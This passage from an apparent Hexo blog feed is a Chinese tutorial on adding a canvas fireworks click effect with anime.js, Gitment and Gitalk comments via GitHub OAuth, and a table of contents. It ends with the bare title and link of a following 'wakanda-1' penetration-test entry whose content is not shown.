function">clearTimeout</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span>a<span class="token operator">=</span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>e<span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">var</span> canvasEl<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">".fireworks"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>canvasEl<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> ctx<span class="token operator">=</span>canvasEl<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token string">"2d"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>numberOfParticules<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">,</span>pointerX<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>pointerY<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>tap<span class="token operator">=</span><span class="token string">"mousedown"</span><span class="token punctuation">,</span>colors<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"#FF1461"</span><span class="token punctuation">,</span><span class="token string">"#18FF92"</span><span class="token punctuation">,</span><span class="token string">"#5A87FF"</span><span class="token punctuation">,</span><span class="token string">"#FBF38C"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>setCanvasSize<span class="token operator">=</span><span class="token function">debounce</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>canvasEl<span class="token punctuation">.</span>width<span class="token operator">=</span><span class="token number">2</span><span class="token operator">*</span>window<span class="token punctuation">.</span>innerWidth<span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>height<span class="token operator">=</span><span class="token number">2</span><span class="token operator">*</span>window<span class="token punctuation">.</span>innerHeight<span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>style<span class="token punctuation">.</span>width<span class="token operator">=</span>window<span class="token punctuation">.</span>innerWidth<span class="token operator">+</span><span class="token string">"px"</span><span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>style<span class="token punctuation">.</span>height<span class="token operator">=</span>window<span class="token punctuation">.</span>innerHeight<span class="token operator">+</span><span class="token string">"px"</span><span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token string">"2d"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">scale</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">,</span>render<span class="token operator">=</span><span class="token function">anime</span><span class="token punctuation">(</span><span class="token punctuation">{</span>duration<span class="token punctuation">:</span><span class="token number">1</span><span class="token operator">/</span><span class="token number">0</span><span class="token punctuation">,</span>update<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>ctx<span class="token punctuation">.</span><span class="token function">clearRect</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>width<span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>height<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span>tap<span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token string">"sidebar"</span><span class="token operator">!==</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>id<span class="token operator">&amp;&amp;</span><span class="token string">"toggle-sidebar"</span><span class="token operator">!==</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>id<span class="token operator">&amp;&amp;</span><span class="token string">"A"</span><span class="token operator">!==</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>nodeName<span class="token operator">&amp;&amp;</span><span class="token string">"IMG"</span><span class="token operator">!==</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>nodeName<span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span>render<span class="token punctuation">.</span><span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">updateCoords</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">animateParticules</span><span class="token punctuation">(</span>pointerX<span class="token punctuation">,</span>pointerY<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token operator">!</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">setCanvasSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"resize"</span><span class="token punctuation">,</span>setCanvasSize<span class="token punctuation">,</span><span class="token operator">!</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token string">"use strict"</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">updateCoords</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span>pointerX<span class="token operator">=</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>clientX<span class="token operator">||</span>e<span class="token punctuation">.</span>touches<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>clientX<span class="token punctuation">)</span><span class="token operator">-</span>canvasEl<span class="token punctuation">.</span><span class="token function">getBoundingClientRect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>left<span class="token punctuation">,</span>pointerY<span class="token operator">=</span>e<span class="token punctuation">.</span>clientY<span class="token operator">||</span>e<span class="token punctuation">.</span>touches<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>clientY<span class="token operator">-</span>canvasEl<span class="token punctuation">.</span><span class="token function">getBoundingClientRect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>top<span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">setParticuleDirection</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> t<span class="token operator">=</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">360</span><span class="token punctuation">)</span><span class="token operator">*</span>Math<span class="token punctuation">.</span>PI<span class="token operator">/</span><span class="token number">180</span><span class="token punctuation">,</span>a<span class="token operator">=</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">180</span><span class="token punctuation">)</span><span class="token punctuation">,</span>n<span class="token operator">=</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">*</span>a<span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">{</span>x<span class="token punctuation">:</span>e<span class="token punctuation">.</span>x<span class="token operator">+</span>n<span class="token operator">*</span>Math<span class="token punctuation">.</span><span class="token function">cos</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">,</span>y<span class="token punctuation">:</span>e<span class="token punctuation">.</span>y<span class="token operator">+</span>n<span class="token operator">*</span>Math<span class="token punctuation">.</span><span class="token function">sin</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">createParticule</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> a<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">return</span> a<span class="token punctuation">.</span>x<span class="token operator">=</span>e<span class="token punctuation">,</span>a<span class="token punctuation">.</span>y<span class="token operator">=</span>t<span class="token punctuation">,</span>a<span class="token punctuation">.</span>color<span class="token operator">=</span>colors<span class="token punctuation">[</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>colors<span class="token punctuation">.</span>length<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>radius<span class="token operator">=</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>endPos<span class="token operator">=</span><span class="token function">setParticuleDirection</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>draw<span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>ctx<span class="token punctuation">.</span><span class="token function">beginPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">arc</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>x<span class="token punctuation">,</span>a<span class="token punctuation">.</span>y<span class="token punctuation">,</span>a<span class="token punctuation">.</span>radius<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">*</span>Math<span class="token punctuation">.</span>PI<span class="token punctuation">,</span><span class="token operator">!</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span>fillStyle<span class="token operator">=</span>a<span class="token punctuation">.</span>color<span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>a<span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">createCircle</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> a<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">return</span> a<span class="token punctuation">.</span>x<span class="token operator">=</span>e<span class="token punctuation">,</span>a<span class="token punctuation">.</span>y<span class="token operator">=</span>t<span class="token punctuation">,</span>a<span class="token punctuation">.</span>color<span class="token operator">=</span><span class="token string">"#F00"</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>radius<span class="token operator">=</span><span class="token number">0.1</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>alpha<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>lineWidth<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">,</span>a<span class="token punctuation">.</span>draw<span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>ctx<span class="token punctuation">.</span>globalAlpha<span class="token operator">=</span>a<span class="token punctuation">.</span>alpha<span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">beginPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">arc</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>x<span class="token punctuation">,</span>a<span class="token punctuation">.</span>y<span class="token punctuation">,</span>a<span class="token punctuation">.</span>radius<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">*</span>Math<span class="token punctuation">.</span>PI<span class="token punctuation">,</span><span class="token operator">!</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span>lineWidth<span class="token operator">=</span>a<span class="token punctuation">.</span>lineWidth<span class="token punctuation">,</span>ctx<span class="token punctuation">.</span>strokeStyle<span class="token operator">=</span>a<span class="token punctuation">.</span>color<span class="token punctuation">,</span>ctx<span class="token punctuation">.</span><span class="token function">stroke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ctx<span class="token punctuation">.</span>globalAlpha<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span>a<span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">renderParticule</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> t<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>t<span class="token operator">&lt;</span>e<span class="token punctuation">.</span>animatables<span class="token punctuation">.</span>length<span class="token punctuation">;</span>t<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>e<span class="token punctuation">.</span>animatables<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">.</span>target<span class="token punctuation">.</span><span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">animateParticules</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> a<span class="token operator">=</span><span class="token function">createCircle</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">,</span>n<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>numberOfParticules<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>n<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token function">createParticule</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span>anime<span class="token punctuation">.</span><span class="token function">timeline</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">{</span>targets<span class="token punctuation">:</span>n<span class="token punctuation">,</span>x<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> e<span class="token punctuation">.</span>endPos<span class="token punctuation">.</span>x<span class="token punctuation">}</span><span class="token punctuation">,</span>y<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> e<span class="token punctuation">.</span>endPos<span class="token punctuation">.</span>y<span class="token punctuation">}</span><span class="token punctuation">,</span>radius<span class="token punctuation">:</span><span class="token number">0.1</span><span class="token punctuation">,</span>duration<span class="token punctuation">:</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">1200</span><span class="token punctuation">,</span><span class="token number">1800</span><span class="token punctuation">)</span><span class="token punctuation">,</span>easing<span class="token punctuation">:</span><span class="token string">"easeOutExpo"</span><span class="token punctuation">,</span>update<span class="token punctuation">:</span>renderParticule<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">{</span>targets<span class="token punctuation">:</span>a<span class="token punctuation">,</span>radius<span class="token punctuation">:</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">160</span><span class="token punctuation">)</span><span class="token punctuation">,</span>lineWidth<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>alpha<span class="token punctuation">:</span><span class="token punctuation">{</span>value<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>easing<span class="token punctuation">:</span><span class="token string">"linear"</span><span class="token punctuation">,</span>duration<span class="token punctuation">:</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">600</span><span class="token punctuation">,</span><span class="token number">800</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>duration<span class="token punctuation">:</span>anime<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">1200</span><span class="token punctuation">,</span><span class="token number">1800</span><span class="token punctuation">)</span><span class="token punctuation">,</span>easing<span class="token punctuation">:</span><span class="token string">"easeOutExpo"</span><span class="token punctuation">,</span>update<span class="token punctuation">:</span>renderParticule<span class="token punctuation">,</span>offset<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">debounce</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> a<span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> n<span class="token operator">=</span><span class="token keyword">this</span><span class="token punctuation">,</span>i<span class="token operator">=</span>arguments<span class="token punctuation">;</span><span class="token function">clearTimeout</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span>a<span class="token operator">=</span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>e<span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>t<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">var</span> canvasEl<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">".fireworks"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>canvasEl<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> ctx<span class="token operator">=</span>canvasEl<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token string">"2d"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>numberOfParticules<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">,</span>pointerX<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>pointerY<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>tap<span class="token operator">=</span><span class="token string">"mousedown"</span><span class="token punctuation">,</span>colors<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"#FF1461"</span><span class="token punctuation">,</span><span class="token string">"#18FF92"</span><span class="token punctuation">,</span><span class="token string">"#5A87FF"</span><span class="token punctuation">,</span><span class="token string">"#FBF38C"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>setCanvasSize<span class="token operator">=</span><span class="token function">debounce</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>canvasEl<span class="token punctuation">.</span>width<span class="token operator">=</span><span class="token number">2</span><span class="token operator">*</span>window<span class="token punctuation">.</span>innerWidth<span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>height<span class="token operator">=</span><span class="token number">2</span><span class="token operator">*</span>window<span class="token punctuation">.</span>innerHeight<span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>style<span class="token punctuation">.</span>width<span class="token operator">=</span>window<span class="token punctuation">.</span>innerWidth<span class="token operator">+</span><span class="token string">"px"</span><span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>style<span class="token punctuation">.</span>height<span class="token operator">=</span>window<span class="token punctuation">.</span>innerHeight<span class="token operator">+</span><span class="token string">"px"</span><span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token string">"2d"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">scale</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">,</span>render<span class="token operator">=</span><span class="token function">anime</span><span class="token punctuation">(</span><span class="token punctuation">{</span>duration<span class="token punctuation">:</span><span class="token number">1</span><span class="token operator">/</span><span class="token number">0</span><span class="token punctuation">,</span>update<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>ctx<span class="token punctuation">.</span><span class="token function">clearRect</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>width<span class="token punctuation">,</span>canvasEl<span class="token punctuation">.</span>height<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span>tap<span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token string">"sidebar"</span><span class="token operator">!==</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>id<span class="token operator">&amp;&amp;</span><span class="token string">"toggle-sidebar"</span><span class="token operator">!==</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>id<span class="token operator">&amp;&amp;</span><span class="token string">"A"</span><span class="token operator">!==</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>nodeName<span class="token operator">&amp;&amp;</span><span class="token string">"IMG"</span><span class="token operator">!==</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>nodeName<span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span>render<span class="token punctuation">.</span><span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">updateCoords</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">animateParticules</span><span class="token punctuation">(</span>pointerX<span class="token punctuation">,</span>pointerY<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token operator">!</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">setCanvasSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"resize"</span><span class="token punctuation">,</span>setCanvasSize<span class="token punctuation">,</span><span class="token operator">!</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>在/layout/layout.ejs中写入：</p><pre class=" language-html"><code class="language-html">{% if theme.fireworks %}>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>canvas</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fireworks<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">position</span><span class="token punctuation">:</span> fixed<span class="token punctuation">;</span><span class="token property">left</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token property">top</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token property">z-index</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token property">pointer-events</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>canvas</span><span class="token punctuation">></span></span> >    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>//cdn.bootcss.com/animejs/2.2.0/anime.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> >    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/js/src/fireworks.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>> {% endif %}</code></pre><p>然后，在相应主题的config文件加入</p><pre class=" language-shell"><code class="language-shell">fireworks: true</code></pre></blockquote><h2 id="9-设置评论功能Gitment"><a href="#9-设置评论功能Gitment" class="headerlink" title="9.设置评论功能Gitment"></a>9.设置评论功能Gitment</h2><blockquote><p><img src="https://i.loli.net/2018/10/06/5bb852eb79447.png" alt=""></p><p>owner github用户名，repo存储评论的仓库，clientId和clientSecret需要自己注册github app</p><p><a href="https://github.com/settings/applications" target="_blank" rel="noopener">https://github.com/settings/applications</a></p><p>切记Authorization callback URL 要填写CNAME解析的域名（未解析则填默认github的域名），否则可能无法使用</p><p><img src="https://i.loli.net/2018/10/06/5bb8533843b56.png" alt=""></p><p>然后凄惨地发现作者服务停止了，参考<a href="https://www.jianshu.com/p/f2f4c802914b" target="_blank" rel="noopener">https://www.jianshu.com/p/f2f4c802914b</a></p></blockquote><h2 id="10-添加目录"><a href="#10-添加目录" class="headerlink" title="10.添加目录"></a>10.添加目录</h2><blockquote><p>在主题的模板文件，找到文章内容模板，将其插入在内容前面即可。</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>%- toc<span class="token punctuation">(</span>page.content, <span class="token punctuation">{</span>        class: <span class="token string">'post-toc'</span>,        list_number: <span class="token boolean">false</span><span class="token punctuation">}</span><span class="token punctuation">)</span> %<span class="token operator">></span></code></pre></blockquote><h2 id="11-添加Gitalk"><a href="#11-添加Gitalk" class="headerlink" title="11.添加Gitalk"></a>11.添加Gitalk</h2><blockquote><p>已经集成了Gitalk的主题按如下配置即可：</p><p><img src="https://i.loli.net/2018/10/14/5bc2cd32b93d9.png" alt=""></p><p>owner就是用户名，repo是仓库名，至于clientID，clientSecret，需要自行申请创建 OAuth applications。评论需要涉及 GitHub 授权登录，所以在这里你先要有一个 GitHub application。GitHub 授权登录遵循 <a href="http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html" target="_blank" rel="noopener">OAuth 2.0 标准</a>。OAuth applications 创建如下图所示，填写上面相应的内容。</p><p><img src="https://i.loli.net/2018/10/14/5bc2ceac7ef32.png" alt=""></p></blockquote><h2 id="Gitalk-报错-redirect问题"><a href="#Gitalk-报错-redirect问题" class="headerlink" title="Gitalk 报错 redirect问题"></a>Gitalk 报错 redirect问题</h2><blockquote><p>由于之前写的authorization callback url 为http协议开头，然后又开启了github强制https选项，于是会报错，跳转到首页，并且无法初始化问题，这个时候只需要把 authorization callback url 改成https协议即可.</p><p><img src="https://i.loli.net/2018/10/15/5bc418107dc99.png" alt=""></p></blockquote><blockquote><p> 继续更新中。。。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 杂文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git账户 </tag>
            
            <tag> Hexo搭建 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>wakanda-1-靶机渗透</title>
      <link href="/2018/09/15/wakanda-1-%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"/>
      <url>/2018/09/15/wakanda-1-%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/</url>
      
